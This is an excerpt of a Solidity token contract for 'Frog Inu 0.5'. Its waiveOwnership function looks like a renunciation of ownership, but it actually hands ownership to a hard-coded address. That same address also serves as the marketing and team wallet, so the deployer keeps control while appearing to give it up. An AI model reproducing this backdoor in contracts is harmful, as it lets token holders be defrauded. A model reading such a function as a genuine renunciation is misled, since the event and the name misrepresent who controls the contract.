...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xB00BAE84Dd70998f08973490dfb9639307BA8560));
        _owner = address(0xB00BAE84Dd70998f08973490dfb9639307BA8560);
    }
...
contract froginuhalf is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Frog Inu 0.5";
    string private _symbol ="Frog";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xB00BAE84Dd70998f08973490dfb9639307BA8560);
    address payable public teamWalletAddress = payable(0xB00BAE84Dd70998f08973490dfb9639307BA8560);
